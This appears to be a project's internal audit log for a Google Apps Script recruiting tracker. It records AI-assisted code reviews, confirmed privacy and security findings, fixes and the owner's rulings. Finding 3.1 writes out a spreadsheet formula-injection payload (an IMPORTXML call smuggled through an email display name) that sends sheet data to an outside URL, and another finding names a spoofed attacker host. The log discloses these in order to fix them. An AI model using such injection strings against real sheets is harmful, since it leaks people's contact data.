# Audit findings

Every finding an independent review has raised against the published code, what
was true, and what was done about it. **This file is also the answer when
somebody on Reddit raises something that has already been settled.**

Nothing is deleted from here. A finding that turned out to be wrong stays, with
the reason, because the same wrong finding will be raised again.

---

## Round 1 — 5 September 2026, ChatGPT, run by Jon

Jon pasted the published `Code.gs` into ChatGPT and asked it to check the code
against the website. Recorded in `37-BRIEF-PUBLIC-AUDIT.md` §1 and §3.

| # | Finding | True? | Done |
|---|---|---|---|
| 1.1 | `fetchEvents_` read the entire default calendar, 365 days back and 180 forward, and sent every event title, guest list and organiser to the server. The site said the server receives events *with your contacts*. | **Yes** | Events filtered inside the courier before anything leaves. |
| 1.2 | Five server-chosen cell values reached `setValues()` unguarded. | **Yes** | `safeServerCell_`, which is type-aware so wrapping a date does not turn it into text and break `Next call`. |
| 1.3 | The header claimed a failed run writes nothing. It can stop partway once writing has begun. | **Yes** | Header corrected. |
| 1.4 | `/privacy` called its list of what is sent complete and had omitted the contact rows and the rejected Found addresses. | **Yes** | Both added. |
| 1.5 | `/terms` said Blotter is not open to other people. | **Yes** | Removed. |
| 1.6 | The Gmail scope is `https://mail.google.com/`, full mailbox control. | **No** | It is `gmail.readonly`. The reviewer had only `Code.gs`, and a script that searches mail looks like a script that needs it. **Every audit package now ships `appsscript.json`.** |

---

## Round 2 — 5 September 2026, four independent reviews

Run while building `/audit`, using the exact package that page puts on the
clipboard: the prompt, `appsscript.json`, the published `Code.gs`, and the site's
claims generated from `lib/privacy-copy.ts`.

**These were four Claude runs, not four different vendors.** Four separate
sessions, two models, four different framings, each given only what a stranger
gets and none allowed to read this repository. That buys independence of
reasoning, not independence of training. **ChatGPT and Gemini have not been run
against the current version and should be, because round 1 shows a different
vendor finds different things.**

| Review | Model | Framing |
|---|---|---|
| A | Opus | A general chatbot answering the student's own pasted question |
| B | Opus | A security and data-exposure reviewer |
| C | Sonnet | Claim-by-claim verdicts against the site's copy, exhaustive |
| D | Sonnet | A skeptical commenter deciding whether to warn a subreddit |

Every finding below was re-checked against the source by hand before being
accepted or rejected. Several were raised by more than one review, which is
noted, because agreement between independent framings is worth recording.

### Fixed in code, version 4.6

| # | Finding | Raised by | Verdict |
|---|---|---|---|
| 2.1 | **The telemetry off switch did not switch telemetry off.** The Settings cell says *"Clear this cell to switch it off."* The success path read the cell; the failure path posted to `TELEMETRY_URL_DEFAULT` directly. A student who cleared it went on reporting every failed run forever. | A, B | **True.** Both paths go through `telemetryUrlFrom_` now. It is read early, by `telemetryUrlSetting_`, so a failure inside `readSettings_` — one of the likeliest failures there is — still counts when the student has not opted out, and still stays silent when they have. Sixteen new checks in `helpers.test.js`. |
| 2.2 | **The counting endpoint was not validated at all.** Unlike `Server URL` it had no scheme check, so an `http://` value would have been posted to in the clear, and any host would have been accepted. | B | **True.** `onBlotterHost_` now requires https on `blotterib.com` exactly. Host-anchored, so `blotterib.com.evil.example` fails. Blank still means off. |
| 2.3 | **`applyClosedRowFade_` never removed the rule it had added.** `applyStatusColours_` filters its own rules out before pushing; this one only pushed. Every Step 1 and every design refresh left another identical full-width conditional-format rule behind. | A | **True.** It now drops its own rules first, matched on the formula and pinned to the Closed column so it cannot eat a student's own rule. Rules left by a sheet whose header sat elsewhere are cleaned up too. |

### True, and waiting on a decision from Jon

These are all confirmed against the source. None is fixed, because each needs
either a ruling that changes something the specs already decided, or a change to
copy a stranger reads.

| # | Finding | Raised by | Notes |
|---|---|---|---|
| 2.4 | **The calendar title match sends events with no contact on them.** If no guest matches, an event qualifies when any word in its title matches any contact's **first name alone**. The server's own test (`matchEvent`) needs the first name **and** the firm. So `Dinner with Sam` leaves the account, with its full guest list, organiser and who declined, and the server then discards it. There is no cap on event attendees; mail threads have one at 10. And `eventWords_(n)[0]` takes the first word of the Name cell with no filter, so a contact entered as *"The Blackstone team"* puts `the` on the match list and sends very nearly the whole calendar. | **A, B, C, D — all four** | Genuinely serious, and the one every review led with. `37-BRIEF-PUBLIC-AUDIT.md` §3 ruled the looser test deliberate, so tightening it is Jon's call. See the decision note below. |
| 2.5 | **`checkThisSheet` tells the student something false.** It prints: *"It is a random number that says nothing about you. Not your name, not your email address, neither of which Blotter is ever given."* `student: { addresses: settings.addresses }` is in every request, and the student's display name rides on the `from` of their own sent mail. | A, B | The sentence is wrong as written. Correcting it is in-product copy. |
| 2.6 | **`Server URL` is an ordinary spreadsheet cell validated only for `https://`.** Step 1 does not repair it (`ensureSettingRow_` returns early when the label exists), `prepareForHandover` does not clear it, and `checkThisSheet` does not show it. Blotter is handed round by copying a sheet. | B, D | Narrower than it first looks: anyone who can hand you a doctored Settings cell can usually hand you a doctored script too. It bites on the honest path — a student who pastes the genuine script from `/update` into a sheet whose Settings came from somewhere else. It also undercuts `/audit` itself, because "this posts to blotterib.com" is only true of a stock sheet. |
| 2.7 | **"Every 15 minutes" is wrong for about nine hours a day.** `shouldWorkNow_` throttles to once every 120 minutes between 10pm and 7am. The menu alert discloses this. The script header and `/privacy` step 02 do not. | A, C | Small, concrete, and a reviewer will always find it because it is checkable in four lines. |
| 2.8 | **The design endpoint is not disclosed anywhere.** A `GET` to `/api/design` whenever the server bumps `design_version`, hardcoded, with no way to switch it off. It carries none of the student's data outward, but the payload can replace up to 200 rows of the `Start here` tab, including the section that describes what Blotter can see. `sanitiseDesign_` constrains colours, widths, formats and row *kinds*; the text inside a known kind is free-form. It can also make the sheet fetch an image URL of the server's choosing. | A, B | The claims are unaffected by it, but the *premise of `/audit`* is: the disclosure a student reads in their own sheet is not fixed by the code they audited. It should be said out loud. |
| 2.9 | **The bounce exception is wider than the site describes.** The site says *"when Google's mail system returns an automated delivery-failure notice"*. `isBounceSender_` tests the local part only, at any domain, so `postmaster@anything` qualifies. And *"Only the address travels"* is singular; `failedRecipientsFrom_` returns every address in the retained part of the body. | A, B | **The code should not change.** Real bounces come from the recipient's mail server, not Google's, so restricting the domain would break `Bounced` for the exact addresses a student burns attempts on — and the `Status:` code cannot be trusted either (`04-ENGINE-RULES.md`). What the attacker gains is that addresses in their own message reach our server, which they already knew. **This is a copy problem, not a code one.** |
| 2.10 | **The site's list of what is sent is not exhaustive, and the site says it is.** Missing: the student's own addresses, `install_id`, the Blotter key, `courier_version`, contact row numbers and the `Closed` tickbox, Gmail thread and message ids, `is_outbound`, event ids, the organiser, and who declined. | A, B, C | `privacy-copy.ts` says of step 03: *"Keep it exhaustive — a list that is nearly complete is worse than no list."* By its own standard it fails. |
| 2.11 | **Whole threads, not whole messages.** One message involving a contact pulls every message in that thread, so a third party cc'd once has their display name, address and subject line sent. Known and listed in `37-BRIEF-PUBLIC-AUDIT.md` §5, but no site copy says it. | A, B, C, D | The `/audit` page now says it. `/privacy` does not. |
| 2.12 | **"Blotter never touches a conversation that does not involve one of your contacts"** is false for calendar and misleading for mail, for the two reasons above. | A, B, C, D | Follows from 2.4 and 2.11. |
| 2.13 | **"Delete the spreadsheet and nothing of yours is left anywhere."** Telemetry rows keyed to a per-sheet id, with run times and contact counts, outlive the sheet by design and are disclosed two paragraphs earlier. | A, C, D | The absolute wording outruns the mechanism. Nothing identifying is left; something is. |
| 2.14 | **"There is no third party in the middle."** Read plainly, blotterib.com is a party in the middle. The sentence means *no connection provider*, and the next paragraph says so. | A, C | Defensible, and two of four reviews still tripped on it. |
| 2.15 | **"Every one of them is read-only apart from the spreadsheet you just copied"** (privacy FAQ Q6). Two of the five scopes are not permissions on Google data at all, and one of them, `script.external_request`, is precisely what lets data leave. | C | True. The same framing was in the first draft of `/audit` and has been corrected there already. |
| 2.16 | **"Your recruiting information lives in one place: your own spreadsheet."** It travels to the server every run. Whether it is kept is unprovable; that it travels is not. | C | The sentence is about where it lives rather than where it goes, but it reads as isolation. |
| 2.17 | **"It writes only to Blotter's own columns and tabs, never to a cell you typed in."** `addApprovedContacts_` writes Name and Email — manual columns — when the student ticks Add? on the Found tab. `formatContacts_` also sets font, size and row height across the whole sheet including the student's own columns. | A, C | The *"never a cell you typed in"* half holds: only blank cells are written, and only on the student's instruction. *"Only Blotter's own columns"* does not. |
| 2.18 | **On a refused run the sheet is written before the write phase.** `writeBanner_` runs from the catch around `postToServer_`, deliberately, so a student whose access lapsed gets a sentence instead of a tracker that quietly stopped. The header still says a run that fails before writing leaves the sheet untouched. | A | Round 1 already corrected the *"a failed run writes nothing"* claim. This is the same sentence, one step further in. Review C read the same code and called it true, which is a good example of why every finding gets checked by hand. |

### Raised and rejected

| # | Finding | Raised by | Why not |
|---|---|---|---|
| 2.19 | **Use `gmail.metadata` instead.** It returns headers only and would make "cannot read the text" a limit Google enforces rather than a promise. | B | **Wrong, and it will be raised again.** `gmail.metadata` forbids search queries, and searching for a contact's address is the entire mechanism. There is no narrower scope that works. Verified 5 September 2026 and recorded in `37-BRIEF-PUBLIC-AUDIT.md` §5. B's underlying observation is fair — a narrower Gmail permission does exist — and the privacy FAQ should stop implying none does. |
| 2.20 | **`prepareForHandover` leaves the install id behind**, linking the old owner and the new one. | B | **No.** Script properties belong to the script project, and a copied spreadsheet gets a fresh one, so `PROP_INSTALL_ID` does not travel. The alert tells the student to make a copy and send that. True only if somebody hands over the original sheet, which the flow does not ask for. |
| 2.21 | **`followRedirects: true` lets the server bounce the payload onward.** | A, B | True of the mechanism, immaterial: the destination is already whatever the `Server URL` cell says. Fold into 2.6 rather than treating as its own thing. |
| 2.22 | **The `=IMAGE(...)` fallback leaves a beacon in the sheet.** | B | True and harmless. The URL is Blotter's own, the quote stripping blocks a formula escape, and B classed it low itself. |

---

## Round 3 — 5 September 2026, re-audit of 4.6

Two more independent reviews against the fixed version, one general and one
told to re-check every round 2 fix without assuming any of them worked. The
second is the more useful of the two and the pattern is worth keeping: **a
review that is asked to verify the fixes finds different things from a review
asked to find problems.**

### Confirmed fixed

The regression review re-derived the round 2 fixes from the code and passed
2.2 and 2.3. It found 2.1 still open on one path, which was correct — see 3.2.

### Found, and fixed in 4.7

| # | Finding | Raised by | Verdict |
|---|---|---|---|
| 3.1 | **Approving a Found suggestion could run a formula in the student's sheet.** `writeFoundSuggestions_` guards a server-sent name with `safeCell_`. That guard is a leading apostrophe, which is Sheets' text marker rather than part of the value, so `readFoundTab_` reads back the bare string and `addApprovedContacts_` wrote it into Contacts unguarded. **Reachable by a stranger**: a Found suggestion's name is the display name off an email header, and a display name is chosen by whoever sent the message. Send mail into any thread involving one of the student's contacts, put `=IMPORTXML("https://…"&A2,"//a")` in the From name, and the student ticking Add? runs it in their own account against the contact list Blotter is built never to store. | F | **True, and the worst thing found in three rounds.** `safeCell_` now applied on the way in as well. Ten new checks pin the reason it is needed twice, since the round trip through a cell is what makes the second guard non-obvious. |
| 3.2 | **Approving a Found suggestion could blank the student's own cells.** `addApprovedContacts_` wrote a full-width row of empty strings with the name and email dropped in. `lastRowWithContact_` looks only at Name and Email, so "the first free row" was only free of those two — notes or a formula kept below the last contact, in a column of the student's own, were silently wiped. The site tells students to add whatever columns they like and that Blotter will not touch them. | E | **True.** Writes the two cells it means to write, and clears only Blotter's own columns on that row. |
| 3.3 | **The telemetry off switch still failed open on one path.** `telemetryUrl` started at the default and was only replaced a few statements into the run, so a throw before that line posted a run the student may have switched off. | E, F — independently, and both quoted the same three lines | **True.** It starts empty, which means off. The only runs given up are ones that died before the spreadsheet could be opened at all. |

### Raised and rejected

| # | Finding | Raised by | Why not |
|---|---|---|---|
| 3.4 | **Ticking Closed does not stop Blotter reading that person's mail.** `readContacts_` collects every address regardless of `closed`, so a closed contact's threads are still fetched and sent on every run, forever. The sheet says *"Blotter leaves the row alone."* | E | **The spec decides this and the code is right.** `04-ENGINE-RULES.md`, *"A closed row keeps its history"*: status is `Closed` and days is a dash, but **last contact, attempts and the call dates are still recomputed and shown**. Stop reading their mail and those columns go blank, which is the *"row of empty cells reads as broken"* the same section forbids. **The disclosure point is fair and stands**: a student who ticks Closed may well think Blotter stops looking, and nothing tells them otherwise. That is a wording job, not a code one. |
| 3.5 | **Move `Server URL` to an allow-list.** Same as 2.6. | F | Not rejected. Still Jon's, and now raised by three of six reviews. F put the asymmetry well: the endpoint carrying a count is host-locked and the endpoint carrying a year of mail metadata is not. |
| 3.6 | **The bounce gate is spoofable and reads whole bodies.** Same as 2.9. | E, F | Same answer as 2.9. Restricting the sender's domain would break `Bounced` for real bounces, which come back from the recipient's mail server. **Copy problem.** Both reviews rated it high, both on the strength of the claim rather than the exposure, and that is the point: fix the sentence. |
| 3.7 | **The design payload's `=IMAGE(...)` fallback builds a formula by string concatenation.** | F | F checked it and cleared it in the same breath: stripping `"` blocks the escape. Recorded because it looks alarming and will be raised again. |

---

## Jon's rulings, 5 September 2026, evening

Answered item by item against `39-COPY-PROPOSALS.md`.

| Item | Ruling | Done |
|---|---|---|
| 2.4 calendar | **Option A: match the server exactly.** | 4.8. `firmInTitle_` ported; `selftest.ts` runs both over 280 pairs. |
| 2.5 `checkThisSheet` | First proposed wording rejected as *"AI garbage"*. Rewritten plainly. | 4.8. |
| 2.6 Server URL | **Option B: show it, do not pin it.** | 4.8. `Sends to:` line, warning when not blotterib.com. |
| 2.7, 2.9, 2.10, 2.11 (site), 2.12, 2.14, 2.15, 2.16, 2.17 | Approved as proposed. | `privacy-copy.ts`, `publish.js` header. |
| 2.13 "nothing of yours is left" | **Keep as is.** | No change. |
| 2.18 refused run writes the banner | **Keep as is**: *"has nothing to do with safety."* | No change. |
| 2.11 (script header) | **Disputed**: *"it doesn't read those whole, it can only recommend people on the CC line."* The four lines of `fetchThreads_` were put in front of Jon. | **Pending.** Site copy (item 4) was approved and applied, so the site and the header currently disagree. |

**The public log.** Jon ruled the same evening that the findings are published in
full at `/findings`, rendered from `web/lib/findings.ts`. That file is this
record written for a stranger, and the two must agree on every verdict.

## The one decision this round needed

**2.4, the calendar title match.** `37-BRIEF-PUBLIC-AUDIT.md` §3 ruled the
courier's test *"deliberately looser than the server's own"* so that it can only
ever send more than the server uses and never less. That ruling is why a contact
with no email address still gets `Call scheduled` from an event a student typed
by hand.

The looseness is doing two different jobs, and only one of them was decided:

- **A margin against the server.** Real, and worth keeping.
- **Dropping the firm requirement.** Not required by anything. The server needs
  the first name *and* the firm in the title. The courier asks only for the
  first name, so every event whose title contains a contact's first name leaves
  the account and is then discarded on arrival.

Matching the server exactly would send strictly less and lose nothing, and a
test can pin the two rules together so they cannot drift. That is a change to a
decision the brief already made, so it is Jon's, not ours.

Whichever way it goes, `/privacy` cannot keep saying *"calendar events with your
contacts"* unless the code means it.
